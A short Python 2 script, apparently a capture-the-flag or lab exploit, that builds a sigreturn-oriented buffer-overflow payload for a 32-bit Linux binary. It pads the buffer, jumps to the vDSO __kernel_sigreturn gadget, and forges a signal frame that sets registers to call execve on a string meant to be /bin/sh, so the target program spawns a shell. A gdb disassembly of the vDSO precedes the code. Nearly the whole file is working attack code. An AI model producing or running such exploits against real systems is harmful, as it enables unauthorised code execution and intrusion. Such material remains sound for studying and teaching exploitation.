from struct import pack
'''
gdb-peda$ x/30i 0x55555400
   0x55555400 <__kernel_sigreturn>:     pop    eax
   0x55555401 <__kernel_sigreturn+1>:   mov    eax,0x77
   0x55555406 <__kernel_sigreturn+6>:   int    0x80
   0x55555408 <__kernel_sigreturn+8>:   nop
   0x55555409:  lea    esi,[esi+eiz*1+0x0]
   0x55555410 <__kernel_rt_sigreturn>:  mov    eax,0xad
   0x55555415 <__kernel_rt_sigreturn+5>:        int    0x80
   0x55555417 <__kernel_rt_sigreturn+7>:        nop
   0x55555418:  nop
   0x55555419:  lea    esi,[esi+eiz*1+0x0]
   0x55555420 <__kernel_vsyscall>:      push   ecx
   0x55555421 <__kernel_vsyscall+1>:    push   edx
   0x55555422 <__kernel_vsyscall+2>:    push   ebp
   0x55555423 <__kernel_vsyscall+3>:    mov    ebp,esp
   0x55555425 <__kernel_vsyscall+5>:    sysenter
   0x55555427 <__kernel_vsyscall+7>:    nop
   0x55555428 <__kernel_vsyscall+8>:    nop
   0x55555429 <__kernel_vsyscall+9>:    nop
   0x5555542a <__kernel_vsyscall+10>:   nop
   0x5555542b <__kernel_vsyscall+11>:   nop
   0x5555542c <__kernel_vsyscall+12>:   nop
   0x5555542d <__kernel_vsyscall+13>:   nop
   0x5555542e <__kernel_vsyscall+14>:   int    0x80
   0x55555430 <__kernel_vsyscall+16>:   pop    ebp
   0x55555431 <__kernel_vsyscall+17>:   pop    edx
   0x55555432 <__kernel_vsyscall+18>:   pop    ecx
   0x55555433 <__kernel_vsyscall+19>:   ret
   0x55555434:  add    BYTE PTR [esi],ch
'''
f = open("payload", "w")

sigreturn = 0xf7ffd401
string_addr = 0x804801c # "4"

payload = ""
payload+= "A"*12 + "BBBB"
payload+= pack("<L", sigreturn)
payload+= pack("<L",0x0)                # GS
payload+= pack("<L",0x0)                # FS
payload+= pack("<L",0x2b)               # ES
payload+= pack("<L",0x2b)               # DS
payload+= pack("<L",0)                  # edi
payload+= pack("<L",0)                  # esi
payload+= pack("<L",0x80491c0)          # ebp ( arbitrary )
payload+= pack("<L",0x80491c0)          # esp ( arbitrary )
payload+= pack("<L",string_addr)        # ebx -> /bin/sh
payload+= pack("<L",0)                  # edx ( should be zero )
payload+= pack("<L",0)                  # ecx ( should be zero )
payload+= pack("<L",0xb)                # eax -> execve system call number
payload+= pack("<L",0)                  # trapno
payload+= pack("<L",0)                  # err
payload+= pack("<L",0xf7ffd42e)         # eip -> int 0x80
payload+= pack("<L",0x23)               # cs
payload+= pack("<L",0x206)              # eflags ( arbitrary )
payload+= pack("<L",0)                  # esp_at_signal
payload+= pack("<L",0x2b)               # ss
payload+= "\x00"*18                     # ~

f.write(payload)
f.close()
